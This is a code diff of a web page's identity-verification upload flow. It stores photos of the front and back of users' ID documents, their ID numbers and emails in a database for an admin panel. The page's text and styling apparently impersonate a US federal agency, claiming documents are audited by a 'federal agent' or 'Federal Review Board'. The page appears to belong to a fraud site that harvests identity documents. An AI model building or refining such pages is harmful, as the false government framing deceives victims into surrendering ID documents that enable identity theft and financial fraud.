@@ -138,19 +138,20 @@
 
             const userSnap = await getDoc(doc(db, "users", user.uid));
             userProfile = userSnap.data() || {};
-            const status = (userProfile.status || "").toUpperCase();
+            
+            // WE NOW CHECK kycStatus INSTEAD OF JUST GENERAL status
+            const kStatus = userProfile.kycStatus || "NOT STARTED";
 
             document.getElementById('loading-state').style.display = 'none';
 
-            // If already verified or pending, block the page
-            if (status.includes("VERIFIED") || status.includes("REVIEW") || status.includes("SUBMITTED")) {
+            if (kStatus === "PENDING" || kStatus === "APPROVED") {
                 document.getElementById('form-container').style.display = 'block';
                 document.getElementById('form-container').innerHTML = `
                     <div style="background: white; padding: 40px 20px; border-radius: 15px; text-align: center; border-top: 5px solid #f59e0b;">
                         <span style="font-size: 40px;">⏳</span>
                         <h3 style="color: var(--sba-blue); margin-top: 15px;">AUTHENTICATION PENDING</h3>
                         <p style="font-size: 12px; color: #64748b; line-height: 1.6;">
-                            Your documents have been received and are currently being audited by a federal agent. This usually takes 2-4 hours.
+                            Your documents are currently being audited by the Federal Review Board. Please allow up to 24 hours for verification.
                         </p>
                         <button onclick="location.href='dashboard.html'" class="submit-btn">Back to Dashboard</button>
                     </div>
@@ -163,18 +164,18 @@
         // UI Previews
         document.getElementById('fileFront').onchange = (e) => { 
             if(e.target.files[0]) {
-                document.getElementById('frontName').innerText = "READY FOR TRANSMISSION";
+                document.getElementById('frontName').innerText = "FRONT LOADED";
                 document.getElementById('iconFront').innerText = "✅";
             }
         };
         document.getElementById('fileBack').onchange = (e) => { 
             if(e.target.files[0]) {
-                document.getElementById('backName').innerText = "READY FOR TRANSMISSION";
+                document.getElementById('backName').innerText = "BACK LOADED";
                 document.getElementById('iconBack').innerText = "✅";
             }
         };
 
-        // Resize function to keep things fast
+        // NEW COMPRESSOR: Fixes the Chrome Exit/Crash Issue
         const processImg = (file) => new Promise((resolve) => {
             const reader = new FileReader();
             reader.readAsDataURL(file);
@@ -183,11 +184,12 @@
                 img.src = e.target.result;
                 img.onload = () => {
                     const canvas = document.createElement('canvas');
-                    const scale = Math.min(800 / img.width, 800 / img.height);
+                    // We shrink it to max 600px width so it doesn't crash the browser
+                    const scale = Math.min(600 / img.width, 600 / img.height);
                     canvas.width = img.width * scale;
                     canvas.height = img.height * scale;
                     canvas.getContext('2d').drawImage(img, 0, 0, canvas.width, canvas.height);
-                    resolve(canvas.toDataURL('image/jpeg', 0.7));
+                    resolve(canvas.toDataURL('image/jpeg', 0.6)); // 0.6 quality is enough to see clearly
                 };
             };
         });
@@ -198,38 +200,42 @@
             const back = document.getElementById('fileBack').files[0];
             const num = document.getElementById('idNumber').value.trim();
 
-            if(!front || !back || !num) return alert("All fields are required for federal verification.");
+            if(!front || !back || !num) return alert("NOTICE: All documents and ID numbers are required.");
 
             uploadBtn.disabled = true;
-            uploadBtn.innerText = "UPLOADING TO SECURE SERVER...";
+            uploadBtn.innerText = "TRANSMITTING DATA...";
 
             try {
                 const fData = await processImg(front);
                 const bData = await processImg(back);
 
-                // Send to Admin (MATCHING ADMIN PANEL VARIABLE NAMES)
+                // Send to Admin
                 await addDoc(collection(db, "requests"), {
                     userId: auth.currentUser.uid,
-                    userName: userProfile.fullName || "New Applicant",
-                    type: "KYC",
-                    frontImg: fData, // Matches Admin logic
-                    backImg: bData,   // Matches Admin logic
+                    userName: userProfile.fullName || "Applicant",
+                    userEmail: auth.currentUser.email,
+                    type: "KYC VERIFICATION",
+                    frontImg: fData,
+                    backImg: bData,
                     idNumber: num,
+                    idType: document.getElementById('idType').value,
                     status: "PENDING",
                     timestamp: serverTimestamp()
                 });
 
-                // Update User Status
+                // IMPORTANT: Update kycStatus to break the loop in Apply/Transfer
                 await updateDoc(doc(db, "users", auth.currentUser.uid), {
-                    status: "PENDING VERIFICATION"
+                    kycStatus: "PENDING",
+                    status: "IDENTITY PENDING AUDIT"
                 });
 
-                alert("SUCCESS: Documents transmitted securely.");
+                alert("SUCCESS: Your identity documents have been transmitted for review.");
                 window.location.href = 'dashboard.html';
             } catch (err) {
-                alert("Transmission failed. Please check connection.");
+                console.error(err);
+                alert("NETWORK ERROR: Data not transmitted. Try again.");
                 uploadBtn.disabled = false;
-                uploadBtn.innerText = "TRANSMIT DOCUMENTS";
+                uploadBtn.innerText = "Transmit Documents";
             }
         };
     </script>
